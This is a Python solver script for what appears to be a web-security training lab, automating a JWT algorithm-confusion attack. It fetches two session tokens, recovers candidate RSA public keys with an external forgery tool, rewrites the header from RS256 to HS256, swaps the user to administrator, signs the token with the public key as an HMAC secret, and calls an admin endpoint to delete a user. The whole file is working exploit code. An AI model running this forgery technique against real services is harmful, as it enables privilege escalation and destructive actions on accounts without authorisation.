import sys
import requests
import re
import base64
import hmac
import hashlib
import subprocess


class Solver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'

    def get_csrf(self):
        response = requests.get(self.lab_url + 'login')
        return re.search('value="(.*)"', response.text).group(1)

    def get_jwt_token(self):
        data = {'csrf': self.get_csrf(), 'username': 'wiener', 'password': 'peter'}
        session = requests.Session()
        session.post(self.lab_url + 'login', data=data)
        return session.cookies['session']

    @staticmethod
    def generate_hs256_signature(secret_key, data):
        secret_key = bytes(secret_key, 'utf-8')
        data = bytes(data, 'utf-8')
        signature = hmac.new(secret_key, data, hashlib.sha256).digest()
        return base64.urlsafe_b64encode(signature).decode().rstrip('=')

    @staticmethod
    def crack_public_key_using_two_tokens(token1, token2):
        command = subprocess.run(['python3', 'jwt_forgery.py', token1, token2], capture_output=True)
        public_key_files = re.findall(b'(\w+x509\.pem)', command.stdout)
        return public_key_files

    def generate_malicious_tokens(self):
        token1 = self.get_jwt_token()
        token2 = self.get_jwt_token()
        header1, payload1, _ = token1.split('.')
        header2, payload2, _ = token2.split('.')
        public_key_files = self.crack_public_key_using_two_tokens(token1, token2)
        tokens = []
        header2 += '=' * (len(header2) % 4)
        header2 = base64.urlsafe_b64decode(header2)
        header2 = header2.replace(b'RS256', b'HS256')
        header2 = base64.urlsafe_b64encode(header2).rstrip(b'=')
        payload2 += '=' * (len(payload2) % 4)
        payload2 = base64.urlsafe_b64decode(payload2)
        payload2 = payload2.replace(b'wiener', b'administrator')
        payload2 = base64.urlsafe_b64encode(payload2).rstrip(b'=')
        data = header2.decode() + '.' + payload2.decode()
        for public_key in public_key_files:
            pem_public_key = subprocess.run(['cat', public_key], capture_output=True).stdout
            signature = self.generate_hs256_signature(pem_public_key.decode(), data)
            tokens.append(header2.decode() + '.' + payload2.decode() + '.' + signature)
        return tokens

    def delete_the_user(self):
        for token in self.generate_malicious_tokens():
            cookies = {'session': token}
            response = requests.get(self.lab_url + 'admin/delete?username=carlos', cookies=cookies)
            if 'wiener' in response.text and 'carlos' not in response.text:
                print('You solved the lab.')
                print('Coded by Mohamed Ahmed (ma4747gh).')
                print('My GitHub account: https://github.com/ma4747gh')
                print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')
                break

    def start(self):
        self.delete_the_user()


solver = Solver(sys.argv[1])
solver.start()
